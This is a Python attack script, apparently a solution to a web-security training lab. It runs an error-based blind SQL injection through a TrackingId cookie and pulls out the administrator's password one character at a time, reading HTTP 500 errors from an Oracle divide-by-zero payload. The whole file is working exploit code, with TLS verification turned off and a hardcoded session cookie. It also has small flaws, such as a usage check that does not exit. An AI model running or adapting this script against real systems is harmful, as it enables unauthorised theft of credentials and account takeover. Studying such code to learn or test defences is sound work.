import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # disable warnings

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # so we can proxy thru burp




def sqli_password(url): #1 run sqlbrute
    password_extracted = "" #store letters here
    for i in range(1,21): #from 1 to 20 cause our password is 20 characters
        for j in range(32,126): #ascii equivalent
            sqli_payload = "' || (select case when (1=1) then to_char(1/0) else '' end from users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j) # replace the %s with i and j - this payload is tested thru burp if given letter is correct and username = administrator it will run the select part which will result to an error cause of 1/0.
            sqli_payload_encoded = urllib.parse.quote(sqli_payload) #URL encode the payload using urllib.parse
            cookies = {'TrackingId' : 'Afl6hIoqwV6FmvDY' + sqli_payload_encoded, 'session': 'q2fYGa5hRsaGA65Mim5UsRC9uFF3xQEx'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies) # run the requests url, cookies, verify, proxies
            if r.status_code ==500: #if error  = our characters is correct
                password_extracted += chr(j) #char() converts ascii to normal characters
                sys.stdout.write('\r' + password_extracted) #show what characters is correct
                sys.stdout.flush() # flush stdout
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j)) # display characters we trying
                sys.stdout.flush()


def main():
    if len(sys.argv) !=2: # if provided missing args
        print("(+) Usage: %s <url>" % sys.argv[0]) #print usage
        print("(+) Example: %s www.test.com" % sys.argv[0]) # print example

    url = sys.argv[1] #if provided args is correct
    print("(+) Retreiving Password...") 
    sqli_password(url) # run sqlibrute 1



if __name__ == "__main__":
    main()